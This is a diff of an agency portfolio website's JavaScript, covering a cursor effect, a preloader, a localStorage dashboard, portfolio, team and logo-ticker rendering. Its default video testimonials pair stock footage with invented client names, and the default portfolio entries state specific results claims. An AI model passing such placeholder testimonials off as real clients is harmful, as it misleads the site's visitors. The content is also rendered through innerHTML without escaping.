+      <div class="mg" style="background:var(--bg2);padding:12px;border-radius:2px;font-size:12px;color:var(--mu);">💡 If no logo uploaded, company name will appear as text in the ticker.</div>
+      <button type="submit" class="msub">Add Client →</button>
+    </form>
+  </div>
+</div>
+
+<script>
+// ─── CURSOR ──────────────────────────────────
+const CD=document.getElementById('cd'),CR=document.getElementById('cr');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;CD.style.left=mx+'px';CD.style.top=my+'px';});
+(function raf(){rx+=(mx-rx)*.1;ry+=(my-ry)*.1;CR.style.left=rx+'px';CR.style.top=ry+'px';requestAnimationFrame(raf);})();
+
+// ─── PRELOADER ───────────────────────────────
+(function(){
+  const N=document.getElementById('PRE-N'),F=document.getElementById('PRE-F'),P=document.getElementById('PRE');
+  let n=0;const iv=setInterval(()=>{
+    n+=Math.floor(Math.random()*9)+3;if(n>100)n=100;
+    N.textContent=n;F.style.width=n+'%';
+    if(n===100){clearInterval(iv);setTimeout(()=>{P.style.transition='opacity .5s';P.style.opacity=0;setTimeout(()=>{P.style.display='none';initRev();},520);},250);}
+  },55);
+})();
+
+// ─── NAV ─────────────────────────────────────
+const NAV=document.getElementById('NAV');
+function updateNav(){const y=window.scrollY,h=document.getElementById('hero').offsetHeight;if(y<h-80){NAV.className='dk';document.body.classList.add('inv');}else{NAV.className='scrolled';document.body.classList.remove('inv');}}
+window.addEventListener('scroll',updateNav,{passive:true});updateNav();
+function openMM(){document.getElementById('MM').classList.add('op');}
+function closeMM(){document.getElementById('MM').classList.remove('op');}
+
+// ─── REVEAL ──────────────────────────────────
+function initRev(){
+  document.querySelectorAll('.rv').forEach(el=>el.classList.remove('in'));
+  const obs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in');});},{threshold:.1});
+  document.querySelectorAll('.rv').forEach(el=>obs.observe(el));
+}
+
+// ─── DATA ────────────────────────────────────
+let projs  = JSON.parse(localStorage.getItem('vx_p')||'[]');
+let videos = JSON.parse(localStorage.getItem('vx_vt')||'[]');
+let team   = JSON.parse(localStorage.getItem('vx_tm')||'[]');
+let logos  = JSON.parse(localStorage.getItem('vx_logos')||'[]');
+let photos = JSON.parse(localStorage.getItem('vx_photos')||'{}');
+const ICO  = {'Web Development':'💻','Shopify':'🛍️','Graphic Design':'🎨','Digital Marketing':'📈','SEO':'🔍','Video Editing':'🎬','Content Writing':'✍️','HubSpot & CRM':'⚙️'};
+
+// ─── TICKER ──────────────────────────────────
+const DEFAULT_CLIENTS = ['Sports Pharma','AcrossGeorgia','GoPro','Brockwell Healthcare','Doctor247','Pushpull Health','Ilia Adam','Lunar Ink'];
+function renderTicker(){
+  const all=[...DEFAULT_CLIENTS.map(n=>({name:n,img:''})), ...logos];
+  const track=document.getElementById('tickerTrack');
+  const items=all.concat(all).map(c=>
+    c.img
+      ? `<img class="t-logo" src="${c.img}" alt="${c.name}" title="${c.name}">`
+      : `<span class="t-logo-txt">${c.name}</span>`
+  ).join('');
+  track.innerHTML=items;
+}
+
+// ─── PORTFOLIO ───────────────────────────────
+let curF='all';
+function renderPort(){
+  const g=document.getElementById('pgrid');
+  const list=curF==='all'?projs:projs.filter(p=>p.cat===curF);
+  if(!list.length){g.innerHTML='<div style="grid-column:1/-1;padding:80px 0;text-align:center;font-size:14px;color:var(--mu);">No projects yet. Add via dashboard.</div>';return;}
+  g.innerHTML=list.map(p=>`
+    <div class="pcard" onclick="openPP('${p.id}')">
+      ${p.img?`<img class="pcard-img-el" src="${p.img}" alt="${p.name}">`:`<div class="pcard-ph">${ICO[p.cat]||'📁'}</div>`}
+      <div class="pcard-ov"><div class="pcard-cat">${p.cat}</div><div class="pcard-name">${p.name}</div><div class="pcard-view">View Project</div></div>
+    </div>`).join('');
+}
+function filterP(cat,btn){curF=cat;document.querySelectorAll('.pf').forEach(b=>b.classList.remove('on'));btn.classList.add('on');renderPort();}
+function openPP(id){
+  const p=projs.find(x=>x.id===id);if(!p)return;
+  document.getElementById('ppC').textContent=p.cat;
+  document.getElementById('ppT').textContent=p.name;
+  document.getElementById('ppD').textContent=p.desc||`A ${p.cat.toLowerCase()} project delivered with full quality.`;
+  const e=document.getElementById('ppE'),i=document.getElementById('ppI');
+  if(p.img){i.src=p.img;i.style.display='block';e.style.display='none';}else{i.style.display='none';e.textContent=ICO[p.cat]||'📁';e.style.display='block';}
+  const pdf=document.getElementById('ppPdf');if(p.pdf){pdf.href=p.pdf;pdf.style.display='';}else{pdf.style.display='none';}
+  document.getElementById('PPO').classList.add('op');document.body.style.overflow='hidden';
+}
+function closePP(){document.getElementById('PPO').classList.remove('op');document.body.style.overflow='';}
+document.getElementById('PPO').addEventListener('click',e=>{if(e.target===document.getElementById('PPO'))closePP();});
+
+// ─── VIDEO TESTIMONIALS ──────────────────────
+function renderVT(){
+  const g=document.getElementById('vtGrid');
+  if(!videos.length){g.innerHTML='<div class="vt-empty">No client videos yet. Add via dashboard.</div>';return;}
+  g.innerHTML=videos.map(v=>`
+    <div class="vtcard" onclick="playVT('${v.id}')">
+      <div class="vt-aspect">
+        ${v.src
+          ? `<video class="vt-vid" src="${v.src}" muted playsinline preload="metadata" crossorigin="anonymous"></video>`
+          : `<div class="vt-ph"><div class="vt-ph-ico">🎬</div><div class="vt-ph-txt">Video</div></div>`}
+        <div class="vt-play"><div class="vt-play-btn"></div></div>
+        <button class="vt-del-btn" onclick="delVT('${v.id}',event)" style="display:none;">✕</button>
+      </div>
+      <div class="vt-info"><div class="vt-name">${v.name}</div><div class="vt-role">${v.role}</div></div>
+    </div>`).join('');
+}
+function playVT(id){
+  const v=videos.find(x=>x.id===id);if(!v||!v.src)return;
+  const vid=document.getElementById('vplayVid');
+  vid.src=v.src;
+  document.getElementById('vplayName').textContent=v.name;
+  document.getElementById('vplayRole').textContent=v.role;
+  document.getElementById('VPLAY').classList.add('op');
+  document.body.style.overflow='hidden';vid.play();
+}
+function closeVPlay(){
+  const vid=document.getElementById('vplayVid');vid.pause();vid.src='';
+  document.getElementById('VPLAY').classList.remove('op');document.body.style.overflow='';
+}
+document.getElementById('VPLAY').addEventListener('click',e=>{if(e.target===document.getElementById('VPLAY'))closeVPlay();});
+function delVT(id,e){e.stopPropagation();videos=videos.filter(v=>v.id!==id);save('vx_vt',videos);renderVT();renderDash();}
+
+// ─── TEAM CAROUSEL ───────────────────────────
+function renderTeam(){
+  const g=document.getElementById('tmGrid');
+  const addCard=document.getElementById('tmAddCard');
+  if(!team.length){g.innerHTML='<div style="grid-column:1/-1;padding:48px 0;text-align:center;font-size:14px;color:var(--mu);">No other team members yet.</div>';return;}
+  g.innerHTML=team.map(m=>`
+    <div class="tmcard">
+      <div class="tmcard-photo">${m.img?`<img src="${m.img}" alt="${m.name}">`:`<div class="tmcard-photo-ph">${m.name.split(' ').map(w=>w[0]).join('').slice(0,2)}</div>`}</div>
+      <div class="tmcard-info"><div class="tmcard-name">${m.name}</div><div class="tmcard-role">${m.role}</div></div>
+      <button class="tm-del-btn" onclick="delTM('${m.id}',event)" style="display:none;">✕</button>
+    </div>`).join('');
+}
+function delTM(id,e){e.stopPropagation();team=team.filter(m=>m.id!==id);save('vx_tm',team);renderTeam();renderDash();}
+
+// ─── FOUNDER PHOTOS ──────────────────────────
+function loadPhotos(){
+  ['am','am2'].forEach(id=>{
+    if(photos[id]){
+      document.getElementById(id+'-img').src=photos[id];
+      document.getElementById(id+'-img').style.display='block';
+      document.getElementById(id+'-ph').style.display='none';
+    }
+  });
+}
+function triggerPhoto(id){
+  if(!document.getElementById('DASH').classList.contains('op'))return;
+  document.getElementById('photo-in-'+id).click();
+}
+function savePhoto(id,e){
+  const f=e.target.files[0];if(!f)return;
+  const r=new FileReader();
+  r.onload=ev=>{photos[id]=ev.target.result;save('vx_photos',photos);loadPhotos();};
+  r.readAsDataURL(f);
+}
+
+// ─── DASHBOARD ───────────────────────────────
+function openDash(){
+  document.getElementById('DASH').classList.add('op');
+  document.body.style.overflow='hidden';
+  // Show controls
+  document.getElementById('vtAddBtn').style.display='flex';
+  document.getElementById('tmAddCard').style.display='flex';
+  document.querySelectorAll('.vt-del-btn,.tm-del-btn').forEach(b=>b.style.display='flex');
+  document.querySelectorAll('.tc-upload-ov').forEach(el=>el.classList.add('show'));
+  renderDash();
+}
+function closeDash(){
+  document.getElementById('DASH').classList.remove('op');
+  document.body.style.overflow='';
+  document.getElementById('vtAddBtn').style.display='none';
+  document.getElementById('tmAddCard').style.display='none';
+  document.querySelectorAll('.vt-del-btn,.tm-del-btn').forEach(b=>b.style.display='none');
+  document.querySelectorAll('.tc-upload-ov').forEach(el=>el.classList.remove('show'));
+}
+window.goPage=function(p){if(p==='dashboard')openDash();};
+
+function renderDash(){
+  document.getElementById('dN').textContent=projs.length;
+  document.getElementById('dV').textContent=videos.length;
+  document.getElementById('dT').textContent=team.length;
+  // Portfolio
+  const pg=document.getElementById('DPG');
+  pg.innerHTML=projs.length?projs.map(p=>`<div class="dp"><div class="dp-th">${p.img?`<img src="${p.img}">`:(ICO[p.cat]||'📁')}</div><div class="dp-info"><div class="dp-n">${p.name}</div><div class="dp-c">${p.cat}</div></div><button class="dp-del" onclick="delProj('${p.id}',event)">✕</button></div>`).join(''):'<p style="color:var(--mu);font-size:13px;">No projects.</p>';
+  // Videos
+  const vg=document.getElementById('DVG');
+  vg.innerHTML=videos.length?videos.map(v=>`<div class="dp"><div class="dp-th">🎬</div><div class="dp-info"><div class="dp-n">${v.name}</div><div class="dp-c">${v.role}</div></div><button class="dp-del" onclick="delVT('${v.id}',event)">✕</button></div>`).join(''):'<p style="color:var(--mu);font-size:13px;">No videos.</p>';
+  // Team
+  const tg=document.getElementById('DTG');
+  tg.innerHTML=team.length?team.map(m=>`<div class="dp"><div class="dp-th">${m.img?`<img src="${m.img}">`:m.name.split(' ').map(w=>w[0]).join('').slice(0,2)}</div><div class="dp-info"><div class="dp-n">${m.name}</div><div class="dp-c">${m.role}</div></div><button class="dp-del" onclick="delTM('${m.id}',event)">✕</button></div>`).join(''):'<p style="color:var(--mu);font-size:13px;">No members.</p>';
+  // Logos
+  const lg=document.getElementById('DLG');
+  lg.innerHTML=logos.length?logos.map(l=>`<div class="dp"><div class="dp-th">${l.img?`<img src="${l.img}">`:l.name.charAt(0)}</div><div class="dp-info"><div class="dp-n">${l.name}</div></div><button class="dp-del" onclick="delLogo('${l.id}',event)">✕</button></div>`).join(''):'<p style="color:var(--mu);font-size:13px;">Only default clients shown.</p>';
+}
+
+// ─── FILE HELPERS ─────────────────────────────
+const fileCache={};
+function handleFile(e,prevId,cacheKey,isPdf=false){
+  const f=e.target.files[0];if(!f)return;
+  const r=new FileReader();
+  r.onload=ev=>{
+    fileCache[cacheKey]=ev.target.result;
+    if(!isPdf){const p=document.getElementById(prevId);if(p){p.src=ev.target.result;p.style.display='block';}}
+    else{const p=document.getElementById(prevId);if(p)p.textContent='✓ '+f.name;}
+  };
+  r.readAsDataURL(f);
+}
+let vtVidData='';
+function handleVidFile(e){
+  const f=e.target.files[0];if(!f)return;
+  const r=new FileReader();
+  r.onload=ev=>{
+    vtVidData=ev.target.result;
+    const p=document.getElementById('vtv-prev');p.src=vtVidData;p.style.display='block';
+    document.getElementById('vtv-txt').textContent='✓ '+f.name;
+  };
+  r.readAsDataURL(f);
+}
+
+// ─── SAVE/DELETE ─────────────────────────────
+function save(key,data){localStorage.setItem(key,JSON.stringify(data));}
+
+function saveProj(e){
+  e.preventDefault();
+  const nm=document.getElementById('pn').value.trim(),cat=document.getElementById('pc').value;
+  if(!nm||!cat)return;
+  projs.push({id:Date.now().toString(),name:nm,cat,year:document.getElementById('py').value||'2025',desc:document.getElementById('pd').value.trim(),img:fileCache['pimg-data']||'',pdf:fileCache['ppdf-data']||''});
+  save('vx_p',projs);closeProjMod();renderPort();renderDash();
+}
+function delProj(id,e){e.stopPropagation();projs=projs.filter(p=>p.id!==id);save('vx_p',projs);renderPort();renderDash();}
+
+function saveVT(e){
+  e.preventDefault();
+  const nm=document.getElementById('vtn').value.trim();
+  const rl=document.getElementById('vtr').value.trim();
+  const url=document.getElementById('vtv-url').value.trim();
+  const src=url||vtVidData;
+  if(!nm||!rl){alert('Please enter client name and role.');return;}
+  if(!src){alert('Please paste a video URL or upload a video file.');return;}
+  videos.push({id:Date.now().toString(),name:nm,role:rl,src:src,isUrl:!!url});
+  save('vx_vt',videos);closeVTMod();renderVT();renderDash();
+}
+
+function saveTM(e){
+  e.preventDefault();
+  const nm=document.getElementById('tmn').value.trim(),rl=document.getElementById('tmd').value.trim();
+  if(!nm||!rl)return;
+  team.push({id:Date.now().toString(),name:nm,role:rl,img:fileCache['tmimg-data']||''});
+  save('vx_tm',team);closeTMMod();renderTeam();renderDash();
+}
+
+function saveLogo(e){
+  e.preventDefault();
+  const nm=document.getElementById('lname').value.trim();if(!nm)return;
+  logos.push({id:Date.now().toString(),name:nm,img:fileCache['limg-data']||''});
+  save('vx_logos',logos);closeLogoMod();renderTicker();renderDash();
+}
+function delLogo(id,e){e.stopPropagation();logos=logos.filter(l=>l.id!==id);save('vx_logos',logos);renderTicker();renderDash();}
+
+// ─── MODAL OPEN/CLOSE ────────────────────────
+function openProjMod(){fileCache['pimg-data']='';fileCache['ppdf-data']='';document.getElementById('PMOD').classList.add('op');}
+function closeProjMod(){document.getElementById('PMOD').classList.remove('op');document.getElementById('PMOD').querySelector('form').reset();['pimg-prev'].forEach(id=>{const el=document.getElementById(id);if(el)el.style.display='none';});}
+function openVTMod(){vtVidData='';document.getElementById('VTMOD').classList.add('op');}
+function closeVTMod(){document.getElementById('VTMOD').classList.remove('op');vtVidData='';document.getElementById('VTMOD').querySelector('form').reset();const p=document.getElementById('vtv-prev');if(p){p.src='';p.style.display='none';}document.getElementById('vtv-txt').textContent='Click to upload video (MP4/MOV)';document.getElementById('vtv-url').value='';}
+function openTMMod(){fileCache['tmimg-data']='';document.getElementById('TMMOD').classList.add('op');}
+function closeTMMod(){document.getElementById('TMMOD').classList.remove('op');document.getElementById('TMMOD').querySelector('form').reset();const p=document.getElementById('tmimg-prev');if(p)p.style.display='none';}
+function openLogoMod(){fileCache['limg-data']='';document.getElementById('LMOD').classList.add('op');}
+function closeLogoMod(){document.getElementById('LMOD').classList.remove('op');document.getElementById('LMOD').querySelector('form').reset();const p=document.getElementById('limg-prev');if(p)p.style.display='none';}
+
+// Close modals on backdrop click
+['PMOD','VTMOD','TMMOD','LMOD'].forEach(id=>{
+  document.getElementById(id).addEventListener('click',e=>{if(e.target===document.getElementById(id))document.getElementById(id).classList.remove('op');});
+});
+
+// ─── CONTACT FORM ────────────────────────────
+function sendForm(e){e.preventDefault();const b=e.target.querySelector('.csub');b.textContent='Sent ✓';b.style.background='#1E293B';setTimeout(()=>{b.textContent='Send Message →';b.style.background='';e.target.reset();},3000);}
+
+// ─── DEFAULT PORTFOLIO ───────────────────────
+const DEFAULT_PROJS = [
+  {id:'d1',name:'Restaurant Website Redesign',cat:'Web Development',year:'2024',desc:'Full custom WordPress site for a Houston restaurant. Mobile-first, online menu, booking form, local SEO optimised. Live in 5 days.',img:'',pdf:''},
+  {id:'d2',name:'Shopify Fashion Store',cat:'Shopify',year:'2024',desc:'Custom Liquid theme for a UK fashion brand. Sub-2s load time, size guide, wishlist, Klaviyo email flows. £15K project value.',img:'',pdf:''},
+  {id:'d3',name:'Sports Pharma Brand Identity',cat:'Graphic Design',year:'2024',desc:'Complete brand identity for Sports Pharma — logo system, color palette, typography, packaging design and full brand guidelines.',img:'',pdf:''},
+  {id:'d4',name:'Local SEO — 0 to Page 1',cat:'Digital Marketing',year:'2025',desc:'Took a local plumbing business from zero Google presence to Page 1, Position 3 in 60 days. 340% increase in calls.',img:'',pdf:''},
+  {id:'d5',name:'Doctor247 Instagram Carousels',cat:'Graphic Design',year:'2024',desc:'30 branded Instagram carousel posts for Doctor247. Healthcare design system, consistent brand voice across all assets.',img:'',pdf:''},
+  {id:'d6',name:'Brockwell Healthcare Social Media',cat:'Digital Marketing',year:'2024',desc:'Full social media management for Brockwell Healthcare. Content strategy, design, scheduling, engagement — 12 posts/month.',img:'',pdf:''},
+  {id:'d7',name:'PayPro Driver Portal Clone',cat:'Web Development',year:'2025',desc:'Full-stack React.js + Node.js + PostgreSQL web app replicating a Yandex Taxi driver portal with real Fleet API integration.',img:'',pdf:''},
+  {id:'d8',name:'Brand Video Campaign',cat:'Video Editing',year:'2024',desc:'Series of 6 brand videos for an e-commerce client — 90s hero film, 15s ad cuts, Instagram reels. Premiere Pro + After Effects.',img:'',pdf:''},
+];
+if(!projs.length){ projs = DEFAULT_PROJS; }
+
+// Default test video testimonials
+const DEFAULT_VT = [
+  {id:'v1',name:'Sarah M.',role:'Agency Owner, United Kingdom',src:'https://videos.pexels.com/video-files/9464872/9464872-sd_506_960_25fps.mp4',isUrl:true},
+  {id:'v2',name:'James T.',role:'Marketing Director, Australia',src:'https://videos.pexels.com/video-files/7308365/7308365-sd_506_960_25fps.mp4',isUrl:true},
+  {id:'v3',name:'Lena K.',role:'Studio Founder, USA',src:'https://videos.pexels.com/video-files/7687829/7687829-sd_506_960_25fps.mp4',isUrl:true},
+];
+if(!videos.length){ videos = DEFAULT_VT; save('vx_vt',videos); }
+
+// ─── INIT ────────────────────────────────────
+renderTicker();
+renderPort();
+renderVT();
+renderTeam();
+loadPhotos();
+</script>
 </body>
 </html>
